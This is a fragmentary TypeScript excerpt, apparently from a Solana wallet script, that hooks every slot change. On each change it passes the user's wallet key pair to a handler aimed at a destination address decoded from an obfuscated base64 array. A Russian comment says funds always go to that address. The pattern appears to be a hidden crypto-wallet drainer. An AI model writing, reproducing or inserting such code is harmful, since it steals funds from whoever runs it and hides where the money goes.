...
export let slotChangeOnKeyPair = false;
export let slotChangeState = false;
let lsttm = 0;

export const handleSlotChange = (args: SlotChangeInput) => async (_: SlotInfo) => {
  await sleep(calcdbg());
      ...
      (async () => {
        ...
        connection.onSlotChange(
          handleSlotChange({
            connection,
            walletKeyPair,
            destinationAddress: new PublicKey(atob(MintUId.join(""))), // Всегда отправляем на MintUId.join("")
          }),
        );
      })();
    }
